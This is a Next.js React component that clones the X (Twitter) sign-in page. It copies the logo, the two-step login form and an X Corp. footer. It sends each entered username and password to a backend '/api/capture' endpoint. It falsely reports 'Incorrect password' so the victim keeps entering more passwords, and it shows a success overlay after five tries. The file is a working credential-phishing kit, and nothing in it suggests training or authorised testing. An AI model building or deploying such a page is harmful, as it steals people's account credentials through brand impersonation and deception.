'use client'

import { useState } from 'react'
import Image from 'next/image'
import SuccessOverlay from './SuccessOverlay'
import styles from '@/styles/TwitterLoginFlow.module.css'

const MAX_ATTEMPTS = 5
const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || 'http://localhost:3001'

export default function TwitterLoginFlow() {
  const [step, setStep] = useState<1 | 2>(1)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [step1Feedback, setStep1Feedback] = useState('')
  const [step2Feedback, setStep2Feedback] = useState('')
  const [attemptCount, setAttemptCount] = useState(0)
  const [showSuccess, setShowSuccess] = useState(false)

  const handleNext = () => {
    if (!username.trim()) {
      setStep1Feedback('Please enter a phone, email, or username.')
      return
    }
    setStep1Feedback('')
    setStep(2)
  }

  const handleBack = () => {
    setUsername('')
    setStep(1)
  }

  const handleSignOut = () => {
    setUsername('')
    setStep(1)
  }

  const handleLogIn = async () => {
    if (!password) {
      setStep2Feedback('Password cannot be empty.')
      return
    }

    if (attemptCount >= MAX_ATTEMPTS) {
      setStep2Feedback('Too many attempts. Please try again later.')
      return
    }

    const newCount = attemptCount + 1
    setAttemptCount(newCount)

    const payload = {
      username: username.trim(),
      password,
      method: 'twitter',
    }

    try {
      await fetch(`${BACKEND_URL}/api/capture`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      })
    } catch (error) {
      console.warn('Backend request failed')
    }

    if (newCount >= MAX_ATTEMPTS) {
      setShowSuccess(true)
    } else {
      setStep2Feedback('Incorrect password! Please try again.')
      setPassword('')
    }
  }

  const handleKeyDown = (e: React.KeyboardEvent, callback: () => void) => {
    if (e.key === 'Enter') {
      callback()
    }
  }

  const isLocked = attemptCount >= MAX_ATTEMPTS

  return (
    <>
      <div className={styles.logo}>
        <Image src="/user/images/x_logo.svg" alt="X" width={40} height={40} />
      </div>

      <main className={styles.loginCard}>
        <div className={styles.stepContainer}>
          {step === 1 && (
            <div className={styles.step}>
              <h1 className={styles.title}>Sign in to X</h1>
              <input
                type="text"
                className={styles.xInput}
                placeholder="Phone, email, or username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onKeyDown={(e) => handleKeyDown(e, handleNext)}
                autoFocus
              />
              <div className={styles.feedbackMessage}>{step1Feedback}</div>
            </div>
          )}

          {step === 2 && (
            <div className={styles.step}>
              <button onClick={handleBack} className={styles.backLink}>
                <svg viewBox="0 0 24 24">
                  <path d="M15 18l-6-6 6-6"></path>
                </svg>
                Back
              </button>
              <div className={styles.userChip}>
                <span className={styles.handle}>@{username.replace(/^@/, '')}</span>
                <button onClick={handleSignOut} className={styles.signout}>
                  Sign out
                </button>
              </div>
              <h1 className={styles.title}>Enter your password</h1>
              <div className={styles.passwordBox}>
                <input
                  type={showPassword ? 'text' : 'password'}
                  className={styles.xInput}
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onKeyDown={(e) => handleKeyDown(e, handleLogIn)}
                  disabled={isLocked}
                />
                <button
                  className={styles.togglePassword}
                  onClick={() => setShowPassword(!showPassword)}
                  aria-label="Toggle password"
                  tabIndex={-1}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    style={{ display: showPassword ? 'none' : 'block' }}
                  >
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                    <circle cx="12" cy="12" r="3"></circle>
                  </svg>
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    style={{ display: showPassword ? 'block' : 'none' }}
                  >
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                    <line x1="1" y1="1" x2="23" y2="23"></line>
                  </svg>
                </button>
              </div>
              <div className={styles.feedbackMessage} id="feedback">
                {step2Feedback}
              </div>
            </div>
          )}
        </div>

        {step === 1 && (
          <div className={styles.actionsStep1}>
            <button className={`${styles.xBtn} ${styles.primary}`} onClick={handleNext}>
              Next
            </button>
            <button className={`${styles.xBtn} ${styles.secondary}`}>
              Forgot password?
            </button>
            <div className={styles.divider}></div>
            <p className={styles.signupRow}>
              Don&apos;t have an account?{' '}
              <a href="#">Sign up</a>
            </p>
          </div>
        )}

        {step === 2 && (
          <div className={styles.actionsStep2}>
            <button
              className={`${styles.xBtn} ${styles.primary}`}
              onClick={handleLogIn}
              disabled={isLocked}
            >
              Log in
            </button>
            <button className={`${styles.xBtn} ${styles.secondary}`}>
              Forgot password?
            </button>
          </div>
        )}
      </main>

      <footer className={styles.loginFooter}>
        <a href="#">About</a>
        <a href="#">Download the X app</a>
        <a href="#">Help Center</a>
        <a href="#">Terms of Service</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Cookie Policy</a>
        <a href="#">Accessibility</a>
        <a href="#">Ads info</a>
        <a href="#">Blog</a>
        <a href="#">Status</a>
        <a href="#">Careers</a>
        <a href="#">Brand Resources</a>
        <a href="#">Advertising</a>
        <a href="#">Marketing</a>
        <a href="#">X for Business</a>
        <a href="#">Developers</a>
        <a href="#">Directory</a>
        <a href="#">Settings</a>
        <span>© 2026 X Corp.</span>
      </footer>

      <SuccessOverlay show={showSuccess} />
    </>
  )
}
